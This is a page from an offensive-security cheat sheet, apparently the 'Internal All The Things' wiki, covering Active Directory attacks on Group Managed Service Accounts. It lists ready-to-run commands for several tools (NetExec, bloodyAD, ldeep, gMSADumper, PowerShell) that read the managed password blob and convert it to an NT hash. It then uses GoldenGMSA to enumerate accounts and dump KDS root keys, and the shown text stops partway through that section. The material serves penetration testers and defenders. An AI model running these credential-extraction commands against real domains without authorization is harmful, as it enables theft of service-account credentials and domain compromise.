# Password - GMSA - Internal All The Things
URL: https://swisskyrepo.github.io/InternalAllTheThings/active-directory/pwd-read-gmsa/

Password - GMSA - Internal All The Things

## Reading GMSA Password

> User accounts created to be used as service accounts rarely have their password changed. Group Managed Service Accounts (GMSAs) provide a better approach (starting in the Windows 2012 timeframe). The password is managed by AD and automatically rotated every 30 days to a randomly generated password of 256 bytes.

### GMSA Attributes in the Active Directory

- `msDS-GroupMSAMembership` (`PrincipalsAllowedToRetrieveManagedPassword`) - stores the security principals that can access the GMSA password.
- `msds-ManagedPassword` - This attribute contains a BLOB with password information for group-managed service accounts.
- `msDS-ManagedPasswordId` - This constructed attribute contains the key identifier for the current managed password data for a group MSA.
- `msDS-ManagedPasswordInterval` - This attribute is used to retrieve the number of days before a managed password is automatically changed for a group MSA.

### Extract NT hash from the Active Directory

- Pennyw0rth/NetExec

```
netexec ldap 10.10.10.10 -u user -p pass --gmsa

# Use --lsa to get GMSA ID
netexec ldap domain.lab -u user -p 'PWD' --gmsa-convert-id 00[...]99
netexec ldap domain.lab -u user -p 'PWD' --gmsa-decrypt-lsa '_SC_GMSA_{[...]}_.....'

```

- CravateRouge/bloodyAD

```
bloodyAD --host 10.10.10.10 -d crash.lab -u john -p 'Pass123*' get search --filter '(ObjectClass=msDS-GroupManagedServiceAccount)' --attr msDS-ManagedPassword

```

- franc-pentest/ldeep

```
ldeep ldap -s dc1.domain.local -u 'username' -p 'P@ssw0rd' -d domain.local gmsa

```

- rvazarkar/GMSAPasswordReader

```
GMSAPasswordReader.exe --accountname SVC_SERVICE_ACCOUNT

```

- micahvandeusen/gMSADumper

`powershell
 python3 gMSADumper.py -u User -p Password1 -d domain.local`

- Active Directory Powershell

```
$gmsa =  Get-ADServiceAccount -Identity 'SVC_SERVICE_ACCOUNT' -Properties 'msDS-ManagedPassword'
$blob = $gmsa.'msDS-ManagedPassword'
$mp = ConvertFrom-ADManagedPasswordBlob $blob
$hash1 =  ConvertTo-NTHash -Password $mp.SecureCurrentPassword

```

- kdejoyce/gMSA_Permissions_Collection.ps1 based on Active Directory PowerShell module

## Forging Golden GMSA

> One notable difference between a Golden Ticket attack and the Golden GMSA attack is that they no way of rotating the KDS root key secret. Therefore, if a KDS root key is compromised, there is no way to protect the gMSAs associated with it.

 You can't "force reset" a gMSA password, because a gMSA's password never changes. The password is derived from the KDS root key and `ManagedPasswordIntervalInDays`, so every Domain Controller can at any time compute what the password is, what it used to be, and what it will be at any point in the future.

- Using GoldenGMSA

```
# Enumerate all gMSAs
GoldenGMSA.exe gmsainfo
# Query for a specific gMSA
GoldenGMSA.exe gmsainfo --sid S-1-5-21-1437000690-1664695696-1586295871-1112

# Dump all KDS Root Keys
GoldenGMSA.exe kdsinfo
# Dump a specific KDS